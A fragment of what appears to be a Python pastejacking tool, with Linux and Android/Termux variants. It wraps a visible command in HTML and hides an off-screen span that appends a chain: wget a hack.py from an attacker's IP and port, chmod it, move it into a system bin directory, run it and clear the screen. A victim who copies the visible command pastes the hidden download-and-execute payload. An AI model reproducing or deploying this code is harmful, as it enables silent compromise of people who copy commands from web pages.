    ...
    try:
       ...
       while counter < length:# add other data which is extra stuff and save it to data.txt file
        ...
        if length > 2:
            ...
            other = False
        if other == True:
            code = '<p>' + text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; ">' + text[1] + ' && wget ' + ip + ':' + port + '/hack.py && clear && chmod +x hack.sh && mv hack.py $root/usr/bin/ && python $root/usr/bin/hack.py && clear <br>' + text[0] + ' </span>' + text[1] + other_data + '</p>'
        elif other == False:
            code = '<p>' + text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; ">' + text[1] + ' && wget ' + ip + ':' + port + '/hack.py && clear && chmod +x hack.py && mv hack.py $root/usr/bin/ && python $root/usr/bin/hack.py && clear <br>' + text[0] + '</span>' + text[1] + '</p>'
        else:
...
def android():
    try:
        ...
        print('')
        if other == True:
            code = '<p>' + text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; ">' + text[1] + ' && wget ' + ip + ':' + port + '/hack.py && clear && chmod +x hack.sh && mv hack.py /data/data/com.termux/files/usr/bin/ && python /data/data/com.termux/files/usr/bin/hack.py && clear <br>' + text[0] + ' </span>' + text[1] + other_data + '</p>'
        elif other == False:
            code = '<p>' + text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; ">' + text[1] + ' && wget ' + ip + ':' + port + '/hack.py && clear && chmod +x hack.py && mv hack.py /data/data/com.termux/files/usr/bin/ && python /data/data/com.termux/files/usr/bin/hack.py && clear <br>' + text[0] + '</span>' + text[1] + '</p>'
        else:
            print('Sorry Somthing went Wrong Please Try agan ....')
            exit()
        data = data.replace(texte, code)
...
##########   #########  #########   ##
    ...
    ''')
        ...
        print('\nSomthing Earror Has Occur Try Agan ....')
        print('\nExit ...')
        exit()
